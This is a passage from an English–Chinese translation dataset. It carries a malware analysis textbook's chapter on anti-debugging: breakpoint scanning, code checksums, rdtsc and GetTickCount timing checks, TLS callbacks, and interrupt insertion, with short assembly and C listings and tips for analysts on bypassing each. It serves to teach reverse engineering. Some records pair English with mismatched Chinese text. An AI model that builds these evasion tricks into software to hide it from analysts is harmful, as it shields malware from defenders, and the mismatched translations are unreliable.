- en: In this example, the code simply looks for a window named OLLYDBG.
  id: totrans-846
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，代码只是寻找名为 OLLYDBG 的窗口。
- en: '**Identifying Debugger Behavior**'
  id: totrans-847
  prefs: []
  type: TYPE_NORMAL
  zh: '**识别调试器行为**'
- en: 'Recall that debuggers can be used to set breakpoints or to single-step through
    a process in order to aid the malware analyst in reverse-engineering. However,
    when these operations are performed in a debugger, they modify the code in the
    process. Several anti-debugging techniques are used by malware to detect this
    sort of debugger behavior: INT scanning, checksum checks, and timing checks.'
  id: totrans-848
  prefs: []
  type: TYPE_NORMAL
  zh: 回想一下，调试器可以用来设置断点或逐行执行进程，以帮助恶意软件分析师进行逆向工程。然而，当这些操作在调试器中执行时，它们会修改进程中的代码。恶意软件使用几种反调试技术来检测这种调试器行为：INT
    扫描、校验和检查和定时检查。
- en: '**356**'
  id: totrans-849
  prefs: []
  type: TYPE_NORMAL
  zh: '**356**'
- en: Chapter 16
  id: totrans-850
  prefs: []
  type: TYPE_NORMAL
  zh: 第 16 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-851
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***INT Scanning***'
  id: totrans-852
  prefs: []
  type: TYPE_NORMAL
  zh: '***INT Scanning***'
- en: INT 3 is the software interrupt used by debuggers to temporarily replace an
    instruction in a running program and to call the debug exception handler—
  id: totrans-853
  prefs: []
  type: TYPE_NORMAL
  zh: INT 3 是调试器用于在运行程序中临时替换指令并调用调试异常处理程序的软件中断——
- en: a basic mechanism to set a breakpoint. The opcode for INT 3 is 0xCC. Whenever
    you use a debugger to set a breakpoint, it modifies the code by inserting a 0xCC.
  id: totrans-854
  prefs: []
  type: TYPE_NORMAL
  zh: 一个基本的设置断点的机制。INT 3 的操作码是 0xCC。每次你使用调试器设置断点时，它都会通过插入 0xCC 来修改代码。
- en: In addition to the specific INT 3 instruction, an INT *immediate* can set any
    interrupt, including 3 ( *immediate* can be a register, such as EAX). The INT
  id: totrans-855
  prefs: []
  type: TYPE_NORMAL
  zh: 除了特定的 INT 3 指令外，INT *立即*可以设置任何中断，包括 3（*立即*可以是寄存器，例如 EAX）。INT
- en: '*immediate* instruction uses two opcodes: 0xCD *value*. This 2-byte opcode
    is less commonly used by debuggers.'
  id: totrans-856
  prefs: []
  type: TYPE_NORMAL
  zh: '*立即*指令使用两个操作码：0xCD *值*。这个 2 字节操作码在调试器中不太常用。'
- en: One common anti-debugging technique has a process scan its own code for an INT
    3 modification by searching the code for the 0xCC opcode, as shown in Listing
    16-6\.
  id: totrans-857
  prefs: []
  type: TYPE_NORMAL
  zh: 一种常见的反调试技术是让进程扫描其代码以查找 INT 3 修改，通过搜索代码中的 0xCC 操作码，如列表 16-6 所示。
- en: call $+5
  id: totrans-858
  prefs: []
  type: TYPE_NORMAL
  zh: call $+5
- en: pop edi
  id: totrans-859
  prefs: []
  type: TYPE_NORMAL
  zh: pop edi
- en: sub edi, 5
  id: totrans-860
  prefs: []
  type: TYPE_NORMAL
  zh: sub edi, 5
- en: mov ecx, 400h
  id: totrans-861
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, 400h
- en: mov eax, 0CCh
  id: totrans-862
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, 0CCh
- en: repne scasb
  id: totrans-863
  prefs: []
  type: TYPE_NORMAL
  zh: repne scasb
- en: jz DebuggerDetected
  id: totrans-864
  prefs: []
  type: TYPE_NORMAL
  zh: jz DebuggerDetected
- en: '*Listing 16-6: Scanning code for breakpoints*'
  id: totrans-865
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 16-6：扫描代码以查找断点*'
- en: This code begins with a call, followed by a pop that puts EIP into EDI.
  id: totrans-866
  prefs: []
  type: TYPE_NORMAL
  zh: 此代码以一个调用开始，然后是一个弹出操作，将EIP放入EDI。
- en: EDI is then adjusted to the start of the code. The code is then scanned for
    0xCC bytes. If a 0xCC byte is found, it knows that a debugger is present. This
    technique can be overcome by using hardware breakpoints instead of software breakpoints.
  id: totrans-867
  prefs: []
  type: TYPE_NORMAL
  zh: 然后将EDI调整为代码的开始处。然后扫描代码以查找0xCC字节。如果找到0xCC字节，它知道调试器存在。这种技术可以通过使用硬件断点而不是软件断点来克服。
- en: '***Performing Code Checksums***'
  id: totrans-868
  prefs: []
  type: TYPE_NORMAL
  zh: '***执行代码校验和***'
- en: Malware can calculate a checksum on a section of its code to accomplish the
    same goal as scanning for interrupts. Instead of scanning for 0xCC, this check
    simply performs a cyclic redundancy check (CRC) or a MD5 checksum of the opcodes
    in the malware.
  id: totrans-869
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以在其代码的一部分上计算校验和，以实现与扫描中断相同的目标。而不是扫描0xCC，这个检查只是对恶意软件中的操作码执行循环冗余校验（CRC）或MD5校验和。
- en: This technique is less common than scanning, but it’s equally effective.
  id: totrans-870
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术不如扫描常见，但同样有效。
- en: Look for the malware to be iterating over its internal instructions followed
    by a comparison to an expected value.
  id: totrans-871
  prefs: []
  type: TYPE_NORMAL
  zh: 寻找恶意软件正在迭代其内部指令，然后与预期值进行比较。
- en: This technique can be overcome by using hardware breakpoints or by manually
    modifying the execution path with the debugger at runtime.
  id: totrans-872
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术可以通过使用硬件断点或在运行时通过调试器手动修改执行路径来克服。
- en: '***Timing Checks***'
  id: totrans-873
  prefs: []
  type: TYPE_NORMAL
  zh: '***时间检查***'
- en: Timing checks are one of the most popular ways for malware to detect debuggers
    because processes run more slowly when being debugged. For example, single-stepping
    through a program substantially slows execution speed.
  id: totrans-874
  prefs: []
  type: TYPE_NORMAL
  zh: 时间检查是恶意软件检测调试器最受欢迎的方法之一，因为被调试的进程运行速度会变慢。例如，逐行执行程序会显著降低执行速度。
- en: Anti-Debugging
  id: totrans-875
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**357**'
  id: totrans-876
  prefs: []
  type: TYPE_NORMAL
  zh: '**357**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-877
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'There are a couple of ways to use timing checks to detect a debugger:'
  id: totrans-878
  prefs: []
  type: TYPE_NORMAL
  zh: 有几种方法可以使用时间检查来检测调试器：
- en: 
  id: totrans-879
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Record a timestamp, perform a couple of operations, take another timestamp,
    and then compare the two timestamps. If there is a lag, you can assume the presence
    of a debugger.
  id: totrans-880
  prefs: []
  type: TYPE_NORMAL
  zh: 记录一个时间戳，执行一些操作，然后获取另一个时间戳，并比较这两个时间戳。如果有延迟，可以假设存在调试器。
- en: 
  id: totrans-881
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Take a timestamp before and after raising an exception. If a process is not
    being debugged, the exception will be handled really quickly; a debugger will
    handle the exception much more slowly. By default, most debuggers require human
    intervention in order to handle exceptions, which causes enormous delay. While
    many debuggers allow you to ignore exceptions and pass them to the program, there
    will still be a sizable delay in such cases.
  id: totrans-882
  prefs: []
  type: TYPE_NORMAL
  zh: 在抛出异常前后获取时间戳。如果一个进程没有被调试，异常将会被非常快速地处理；调试器处理异常则会慢得多。默认情况下，大多数调试器需要人工干预来处理异常，这会导致巨大的延迟。虽然许多调试器允许你忽略异常并将它们传递给程序，但在这种情况下仍然会有相当大的延迟。
- en: '**Using the rdtsc Instruction**'
  id: totrans-883
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用rdtsc指令**'
- en: The most common timing check method uses the rdtsc instruction (opcode 0x0F31),
    which returns the count of the number of ticks since the last system reboot as
    a 64-bit value placed into EDX:EAX. Malware will simply execute this instruction
    twice and compare the difference between the two readings.
  id: totrans-884
  prefs: []
  type: TYPE_NORMAL
  zh: 最常见的时间检查方法使用rdtsc指令（操作码0x0F31），它以64位值的形式返回自上次系统重启以来的滴答计数，放入EDX:EAX。恶意软件将简单地执行此指令两次，并比较两次读取之间的差异。
- en: Listing 16-7 shows a real malware sample using the rdtsc technique.
  id: totrans-885
  prefs: []
  type: TYPE_NORMAL
  zh: 列表16-7展示了使用rdtsc技术的一个真实恶意软件样本。
- en: rdtsc
  id: totrans-886
  prefs: []
  type: TYPE_NORMAL
  zh: rdtsc
- en: xor ecx, ecx
  id: totrans-887
  prefs: []
  type: TYPE_NORMAL
  zh: xor ecx, ecx
- en: add ecx, eax
  id: totrans-888
  prefs: []
  type: TYPE_NORMAL
  zh: add ecx, eax
- en: rdtsc
  id: totrans-889
  prefs: []
  type: TYPE_NORMAL
  zh: rdtsc
- en: sub eax, ecx
  id: totrans-890
  prefs: []
  type: TYPE_NORMAL
  zh: sub eax, ecx
- en: cmp eax, 0xFFF 
  id: totrans-891
  prefs: []
  type: TYPE_NORMAL
  zh: cmp eax, 0xFFF 
- en: jb NoDebuggerDetected
  id: totrans-892
  prefs: []
  type: TYPE_NORMAL
  zh: jb NoDebuggerDetected
- en: rdtsc
  id: totrans-893
  prefs: []
  type: TYPE_NORMAL
  zh: rdtsc
- en: push eax 
  id: totrans-894
  prefs: []
  type: TYPE_NORMAL
  zh: push eax 
- en: ret
  id: totrans-895
  prefs: []
  type: TYPE_NORMAL
  zh: ret
- en: '*Listing 16-7: The rdtsc timing technique*'
  id: totrans-896
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-7：rdtsc时间技术*'
- en: The malware checks to see if the difference between the two calls to rdtsc is
    greater than 0xFFF at , and if too much time has elapsed, the conditional jump
    will not be taken. If the jump is not taken, rdtsc is called again, and the result
    is pushed onto the stack at , which will cause the return to take the execution
    to a random location.
  id: totrans-897
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件检查两次调用rdtsc之间的差异是否大于0xFFF在处，并且如果经过的时间过长，条件跳转将不会执行。如果跳转没有执行，则再次调用rdtsc，并将结果推入堆栈在处，这将导致返回执行到随机位置。
- en: '**Using QueryPerformanceCounter and GetTickCount**'
  id: totrans-898
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用QueryPerformanceCounter和GetTickCount**'
- en: Two Windows API functions are used like rdtsc in order to perform an anti-debugging
    timing check. This method relies on the fact that processors have high-resolution
    performance counters—registers that store counts of activities performed in the
    processor. QueryPerformanceCounter can be called to query this counter twice in
    order to get a time difference for use in a comparison.
  id: totrans-899
  prefs: []
  type: TYPE_NORMAL
  zh: 两个 Windows API 函数被用来像 rdtsc 一样执行反调试时间检查。这种方法依赖于处理器具有高分辨率的性能计数器——存储处理器执行活动计数的寄存器。可以通过调用
    QueryPerformanceCounter 来查询这个计数器两次，以便在比较中使用时间差。
- en: If too much time has passed between the two calls, the assumption is that a
    debugger is being used.
  id: totrans-900
  prefs: []
  type: TYPE_NORMAL
  zh: 如果两次调用之间经过的时间过长，则假设正在使用调试器。
- en: '**358**'
  id: totrans-901
  prefs: []
  type: TYPE_NORMAL
  zh: '**358**'
- en: Chapter 16
  id: totrans-902
  prefs: []
  type: TYPE_NORMAL
  zh: 第 16 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-903
  prefs: []
  type: TYPE_NORMAL
  zh: a = **GetTickCount**();
- en: The function GetTickCount returns the number of milliseconds that have elapsed
    since the last system reboot. (Due to the size allocated for this counter, it
    rolls over after 49.7 days.) An example of GetTickCount in practice is shown in
    Listing 16-8\.
  id: totrans-904
  prefs: []
  type: TYPE_NORMAL
  zh: GetTickCount 函数返回自上次系统重启以来经过的毫秒数。（由于为该计数器分配的大小，它会在 49.7 天后溢出。）GetTickCount 在实际中的应用示例请参见列表
    16-8。
- en: a = **GetTickCount**();
  id: totrans-905
  prefs: []
  type: TYPE_NORMAL
  zh: 头部定义的程序入口点开始。TLS 回调可以用来在入口点之前执行代码，因此在调试器中秘密执行。如果你只依赖于调试器的使用，你可能会错过某些恶意软件功能，因为
    TLS 回调可以在加载到调试器中后立即运行。
- en: MaliciousActivityFunction();
  id: totrans-906
  prefs: []
  type: TYPE_NORMAL
  zh: MaliciousActivityFunction();
- en: b = **GetTickCount**();
  id: totrans-907
  prefs: []
  type: TYPE_NORMAL
  zh: b = **GetTickCount**();
- en: delta = b-a;
  id: totrans-908
  prefs: []
  type: TYPE_NORMAL
  zh: delta = b-a;
- en: if ((delta) > 0x1A)
  id: totrans-909
  prefs: []
  type: TYPE_NORMAL
  zh: if ((delta) > 0x1A)
- en: '{'
  id: totrans-910
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: //Debugger Detected
  id: totrans-911
  prefs: []
  type: TYPE_NORMAL
  zh: //Debugger Detected
- en: '}'
  id: totrans-912
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: else
  id: totrans-913
  prefs: []
  type: TYPE_NORMAL
  zh: else
- en: '{'
  id: totrans-914
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: //Debugger Not Found
  id: totrans-915
  prefs: []
  type: TYPE_NORMAL
  zh: //Debugger Not Found
- en: '}'
  id: totrans-916
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '*Listing 16-8: GetTickCount timing technique*'
  id: totrans-917
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-8：GetTickCount 时间技术*'
- en: All of the timing attacks we’ve discussed can be found during debugging or static
    analysis by identifying two successive calls to these functions followed by a
    comparison. These checks should catch a debugger only if you are single-stepping
    or setting breakpoints between the two calls used to capture the time delta. Therefore,
    the easiest way to avoid detection by timing is to run through these checks and
    set a breakpoint just after them, and then start your single-stepping again. If
    that is not an option, simply modify the result of the comparison to force the
    jump that you want to be taken.
  id: totrans-918
  prefs: []
  type: TYPE_NORMAL
  zh: 我们所讨论的所有时间攻击都可以在调试或静态分析期间通过识别这些函数的连续两次调用并随后进行比较来找到。这些检查应该只在你在两次用于捕获时间差的调用之间单步执行或设置断点时捕获调试器。因此，避免时间检测的最简单方法是在这些检查之后设置一个断点，然后再次开始单步执行。如果这不是一个选项，只需修改比较的结果，以强制执行你想要的跳转。
- en: '**Interfering with Debugger Functionality**'
  id: totrans-919
  prefs: []
  type: TYPE_NORMAL
  zh: '**干扰调试器功能**'
- en: 'Malware can use several techniques to interfere with normal debugger operation:
    thread local storage (TLS) callbacks, exceptions, and interrupt insertion. These
    techniques try to disrupt the program’s execution only if it is under the control
    of a debugger.'
  id: totrans-920
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以使用几种技术来干扰正常的调试器操作：线程局部存储（TLS）回调、异常和中断插入。这些技术仅在程序处于调试器控制下时尝试干扰程序的执行。
- en: '***Using TLS Callbacks***'
  id: totrans-921
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用 TLS 回调***'
- en: You might think that when you load a program into a debugger, it will pause
    at the first instruction the program executes, but this is not always the case.
    Most debuggers start at the program’s entry point as defined by the PE
  id: totrans-922
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能认为当你将程序加载到调试器中时，它将在程序执行的第一个指令处暂停，但这并不总是如此。大多数调试器从由 PE
- en: header. A TLS callback can be used to execute code before the entry point and
    therefore execute secretly in a debugger. If you rely only on the use of a debugger,
    you could miss certain malware functionality, as the TLS callback can run as soon
    as it is loaded into the debugger.
  id: totrans-923
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: TLS is a Windows storage class in which a data object is not an automatic stack
    variable, yet is local to each thread that runs the code. Basically, TLS
  id: totrans-924
  prefs: []
  type: TYPE_NORMAL
  zh: TLS 是一个 Windows 存储类，其中数据对象不是自动堆栈变量，但却是运行代码的每个线程的局部变量。基本上，TLS
- en: allows each thread to maintain a different value for a variable declared using
    Anti-Debugging
  id: totrans-925
  prefs: []
  type: TYPE_NORMAL
  zh: 允许每个线程为使用 Anti-Debugging 声明的变量维护不同的值
- en: '**359**'
  id: totrans-926
  prefs: []
  type: TYPE_NORMAL
  zh: '**359**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-927
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 83](index-393_1.png)'
  id: totrans-928
  prefs: []
  type: TYPE_IMG
  zh: '![Image 83](index-393_1.png)'
- en: '![Image 84](index-393_2.png)'
  id: totrans-929
  prefs: []
  type: TYPE_IMG
  zh: '![Image 84](index-393_2.png)'
- en: TLS. When TLS is implemented by an executable, the code will typically contain
    a .tls section in the PE header, as shown in Figure 16-1\. TLS supports callback
    functions for initialization and termination of TLS data objects.
  id: totrans-930
  prefs: []
  type: TYPE_NORMAL
  zh: TLS。当可执行文件实现 TLS 时，代码通常会在 PE 头部包含一个 .tls 部分，如图 16-1 所示。TLS 支持用于 TLS 数据对象初始化和终止的回调函数。
- en: Windows executes these functions before running code at the normal start of
    a program.
  id: totrans-931
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 在程序正常启动时运行这些函数之前执行。
- en: '*Figure 16-1: TLS callback example—a TLS table in PEview* TLS callbacks can
    be discovered by viewing the .tls section using PEview.'
  id: totrans-932
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-1：TLS 回调示例——PEview 中的 TLS 表* 通过使用 PEview 查看 .tls 部分可以找到 TLS 回调。'
- en: You should immediately suspect anti-debugging if you see a .tls section, as
    normal programs typically do not use this section.
  id: totrans-933
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你看到 .tls 部分，应立即怀疑反调试，因为正常程序通常不会使用这个部分。
- en: Analysis of TLS callbacks is easy with IDA Pro. Once IDA Pro has finished its
    analysis, you can view the entry points for a binary by pressing CTRL-E to display
    all entry points to the program, including TLS callbacks, as shown in Figure 16-2\.
    All TLS callback functions have their labels prepended with TlsCallback. You can
    browse to the callback function in IDA Pro by double-clicking the function name.
  id: totrans-934
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 IDA Pro 分析 TLS 回调非常简单。一旦 IDA Pro 完成分析，你可以通过按 CTRL-E 来显示所有程序的入口点，包括 TLS 回调，如图
    16-2 所示。所有 TLS 回调函数都以 TlsCallback 开头。你可以在 IDA Pro 中通过双击函数名来浏览回调函数。
- en: '*Figure 16-2: Viewing a TLS callback function in IDA Pro* *(press CTRL-E to
    display)*'
  id: totrans-935
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-2：在 IDA Pro 中查看 TLS 回调函数* *(按 CTRL-E 显示)*'
- en: '**360**'
  id: totrans-936
  prefs: []
  type: TYPE_NORMAL
  zh: '**360**'
- en: Chapter 16
  id: totrans-937
  prefs: []
  type: TYPE_NORMAL
  zh: 第 16 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-938
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 85](index-394_1.png)'
  id: totrans-939
  prefs: []
  type: TYPE_IMG
  zh: '![Image 85](index-394_1.png)'
- en: TLS callbacks can be handled within a debugger, though sometimes debuggers will
    run the TLS callback before breaking at the initial entry point. To avoid this
    problem, change the debugger’s settings. For example, if you’re using OllyDbg,
    you can have it pause before the TLS callback by selecting **Options****Debugging
    Options****Events** and setting **System breakpoint** as the place for the first
    pause, as shown in Figure 16-3\.
  id: totrans-940
  prefs: []
  type: TYPE_NORMAL
  zh: TLS 回调可以在调试器内处理，尽管有时调试器会在初始入口点中断之前运行 TLS 回调。为了避免这个问题，更改调试器的设置。例如，如果你使用 OllyDbg，你可以通过选择
    **选项****调试选项****事件** 并将 **系统断点** 设置为第一次暂停的位置来使其在 TLS 回调之前暂停，如图 16-3 所示。
- en: '**NOTE**'
  id: totrans-941
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*OllyDbg 2.0 has more breaking capabilities than version 1.1; for example,
    it can pause* *at the start of a TLS callback. Also, WinDbg always breaks at the
    system breakpoint* *before the TLS callbacks.*'
  id: totrans-942
  prefs: []
  type: TYPE_NORMAL
  zh: '*OllyDbg 2.0 比版本 1.1 具有更多的中断能力；例如，它可以在 TLS 回调的开始处暂停。此外，WinDbg 总是在 TLS 回调之前在系统断点处中断。*'
- en: '*Figure 16-3: OllyDbg first pause options*'
  id: totrans-943
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 16-3：OllyDbg 首次暂停选项*'
- en: Because TLS callbacks are well known, malware uses them less frequently than
    in the past. Not many legitimate applications use TLS callbacks, so a
  id: totrans-944
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 TLS 回调众所周知，恶意软件比过去更少使用它们。很少的合法应用程序使用 TLS 回调，因此
- en: .tls section in an executable can stand out.
  id: totrans-945
  prefs: []
  type: TYPE_NORMAL
  zh: 可执行文件中的 .tls 部分可能会突出显示。
- en: '***Using Exceptions***'
  id: totrans-946
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用异常***'
- en: As discussed earlier, interrupts generate exceptions that are used by the debugger
    to perform operations like breakpoints. In Chapter 15, you learned how to set
    up an SEH to achieve an unconventional jump. The modification of the SEH chain
    applies to both anti-disassembly and anti-debugging. In this section, we will
    skip the SEH specifics (since they were addressed in Chapter 15) and focus on
    other ways that exceptions can be used to hamper the malware analyst.
  id: totrans-947
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，中断生成异常，调试器使用这些异常来执行诸如断点设置等操作。在第 15 章中，你学习了如何设置 SEH 以实现非传统跳转。SEH 链的修改适用于反汇编和反调试。在本节中，我们将跳过
    SEH 的具体细节（因为它们已在第 15 章中讨论过），并关注其他可以用来阻碍恶意软件分析员的方法。
- en: Exceptions can be used to disrupt or detect a debugger. Most exception-based
    detection relies on the fact that debuggers will trap the exception and not immediately
    pass it to the process being debugged for handling. The default setting on most
    debuggers is to trap exceptions and not pass them to the program. If the debugger
    doesn’t pass the exception to the process properly, that failure can be detected
    within the process exception-handling mechanism.
  id: totrans-948
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用异常来干扰或检测调试器。大多数基于异常的检测依赖于调试器将捕获异常而不是立即将其传递给被调试进程进行处理的这一事实。大多数调试器的默认设置是捕获异常而不将其传递给程序。如果调试器没有正确地将异常传递给进程，那么这种失败可以在进程异常处理机制中检测到。
- en: Anti-Debugging
  id: totrans-949
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**361**'
  id: totrans-950
  prefs: []
  type: TYPE_NORMAL
  zh: '**361**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-951
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 86](index-395_1.png)'
  id: totrans-952
  prefs: []
  type: TYPE_IMG
  zh: '![Image 86](index-395_1.png)'
- en: Figure 16-4 shows OllyDbg’s default settings; all exceptions will be trapped
    unless the box is checked. These options are accessed via **Options****Debugging**
    **Options****Exceptions**.
  id: totrans-953
  prefs: []
  type: TYPE_NORMAL
  zh: 图16-4显示了OllyDbg的默认设置；除非勾选框被选中，否则所有异常都将被捕获。这些选项可以通过**选项****调试** **选项****异常**访问。
- en: '*Figure 16-4: Ollydbg exception processing options*'
  id: totrans-954
  prefs: []
  type: TYPE_NORMAL
  zh: '*图16-4：Ollydbg异常处理选项*'
- en: '**NOTE**'
  id: totrans-955
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*When performing malware analysis, we recommend setting the debugging options
    to* *pass all of the exceptions to the program.*'
  id: totrans-956
  prefs: []
  type: TYPE_NORMAL
  zh: '*在进行恶意软件分析时，我们建议将调试选项设置为* *将所有异常传递给程序* *。*'
- en: '***Inserting Interrupts***'
  id: totrans-957
  prefs: []
  type: TYPE_NORMAL
  zh: '***插入中断***'
- en: A classic form of anti-debugging is to use exceptions to annoy the analyst and
    disrupt normal program execution by inserting interrupts in the middle of a valid
    instruction sequence. Depending on the debugger settings, these inser-tions could
    cause the debugger to stop, since it is the same mechanism the debugger itself
    uses to set software breakpoints.
  id: totrans-958
  prefs: []
  type: TYPE_NORMAL
  zh: 一种经典的反调试方式是通过抛出异常来打扰分析师，并在有效指令序列的中间插入中断来干扰正常程序执行。根据调试器的设置，这些插入可能导致调试器停止，因为这是调试器本身用来设置软件断点的相同机制。
- en: '**Inserting INT 3**'
  id: totrans-959
  prefs: []
  type: TYPE_NORMAL
  zh: '**插入INT 3**'
- en: Because INT 3 is used by debuggers to set software breakpoints, one anti-debugging
    technique consists of inserting 0xCC opcodes into valid sections of code in order
    to trick the debugger into thinking that the opcodes are its breakpoints. Some
    debuggers track where they set software breakpoints in order to avoid falling
    for this trick.
  id: totrans-960
  prefs: []
  type: TYPE_NORMAL
  zh: 因为INT 3被调试器用来设置软件断点，所以一种反调试技术是在代码的有效部分插入0xCC操作码，以欺骗调试器，使其认为这些操作码是它的断点。一些调试器跟踪它们设置的软件断点，以避免上当受骗。
- en: The 2-byte opcode sequence 0xCD03 can also be used to generate an INT 3, and
    this is often a valid way for malware to interfere with WinDbg. Outside a debugger,
    0xCD03 generates a STATUS_BREAKPOINT exception. However, inside WinDbg, it catches
    the breakpoint and then silently advances EIP by exactly 1 byte, since a breakpoint
    is normally the 0xCC opcode. This can cause the program to execute a different
    set of instructions when being debugged by WinDbg versus running normally. (OllyDbg
    is not vulnerable to interference using this 2-byte INT 3 attack.)
  id: totrans-961
  prefs: []
  type: TYPE_NORMAL
  zh: '双字节操作码序列0xCD03也可以用来生成INT 3，这通常是恶意软件干扰WinDbg的有效方式。在调试器外部，0xCD03生成STATUS_BREAKPOINT异常。然而，在WinDbg内部，它会捕获断点，然后静默地将EIP向前推进正好1个字节，因为断点通常是0xCC操作码。这可能导致程序在WinDbg调试时与正常运行时执行不同的指令集。（OllyDbg不受到这种2字节INT
    3攻击的干扰。） '
- en: '**362**'
  id: totrans-962
  prefs: []
  type: TYPE_NORMAL
  zh: '**362**'
- en: Chapter 16
  id: totrans-963
  prefs: []
  type: TYPE_NORMAL
  zh: 第16章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-964
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Listing 16-9 shows assembly code that implements this technique. This example
    sets a new SEH and then calls INT 3 to force the code to continue.
  id: totrans-965
  prefs: []
  type: TYPE_NORMAL
  zh: 列表16-9显示了实现此技术的汇编代码。此示例设置了一个新的SEH，然后调用INT 3来强制代码继续执行。
- en: push offset continue
  id: totrans-966
  prefs: []
  type: TYPE_NORMAL
  zh: push offset continue
- en: push dword fs:[0]
  id: totrans-967
  prefs: []
  type: TYPE_NORMAL
  zh: push dword fs:[0]
- en: mov fs:[0], esp
  id: totrans-968
  prefs: []
  type: TYPE_NORMAL
  zh: mov fs:[0], esp
- en: int 3
  id: totrans-969
  prefs: []
  type: TYPE_NORMAL
  zh: int 3
- en: //being debugged
  id: totrans-970
  prefs: []
  type: TYPE_NORMAL
  zh: //being debugged
- en: 'continue:'
  id: totrans-971
  prefs: []
  type: TYPE_NORMAL
  zh: 'continue:'
- en: //not being debugged
  id: totrans-972
  prefs: []
  type: TYPE_NORMAL
  zh: //not being debugged
- en: '*Listing 16-9: INT 3 technique*'
  id: totrans-973
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-9：INT 3技术*'
- en: '**Inserting INT 2D**'
  id: totrans-974
  prefs: []
  type: TYPE_NORMAL
  zh: '**插入INT 2D**'
- en: The INT 2D anti-debugging technique functions like INT 3—the INT 0x2D instruction
    is used to access the kernel debugger. Because INT 0x2D is the way that kernel
    debuggers set breakpoints, the method shown in Listing 16-10 applies.
  id: totrans-975
  prefs: []
  type: TYPE_NORMAL
  zh: INT 2D反调试技术的工作原理类似于INT 3——使用INT 0x2D指令来访问内核调试器。因为INT 0x2D是内核调试器设置断点的方式，所以16-10列表中所示的方法适用。
- en: '**Inserting ICE**'
  id: totrans-976
  prefs: []
  type: TYPE_NORMAL
  zh: '**插入ICE**'
- en: One of Intel’s undocumented instructions is the In-Circuit Emulator (ICE) breakpoint,
    icebp (opcode 0xF1). This instruction is designed to make it easier to debug using
    an ICE, because it is difficult to set an arbitrary breakpoint with an ICE.
  id: totrans-977
  prefs: []
  type: TYPE_NORMAL
  zh: 英特尔未公开指令之一是电路仿真器（ICE）断点，icebp（操作码0xF1）。这个指令是为了使用ICE更容易地进行调试而设计的，因为使用ICE设置任意断点比较困难。
- en: Executing this instruction generates a single-step exception. If the program
    is being traced via single-stepping, the debugger will think it is the normal
    exception generated by the single-step and not execute a previously set exception
    handler. Malware can take advantage of this by using the exception handler for
    its normal execution flow, which would be disrupted in this case.
  id: totrans-978
  prefs: []
  type: TYPE_NORMAL
  zh: 执行此指令会产生单步异常。如果程序正在通过单步执行进行跟踪，调试器会认为它是单步执行产生的正常异常，并且不会执行之前设置的异常处理程序。恶意软件可以通过使用异常处理程序来利用其正常执行流程，在这种情况下，该流程将被中断。
- en: In order to bypass this technique, do not single-step over an icebp instruction.
  id: totrans-979
  prefs: []
  type: TYPE_NORMAL
  zh: 为了绕过这种技术，不要对 icebp 指令进行单步执行。
- en: '**Debugger Vulnerabilities**'
  id: totrans-980
  prefs: []
  type: TYPE_NORMAL
  zh: '**调试器漏洞**'
- en: Like all software, debuggers contain vulnerabilities, and sometimes malware
    authors attack them in order to prevent debugging. Here, we present several popular
    vulnerabilities in the way OllyDbg handles the PE format.
  id: totrans-981
  prefs: []
  type: TYPE_NORMAL
  zh: 与所有软件一样，调试器也包含漏洞，有时恶意软件作者会攻击它们以防止调试。在这里，我们介绍了 OllyDbg 处理 PE 格式时存在的几个常见漏洞。
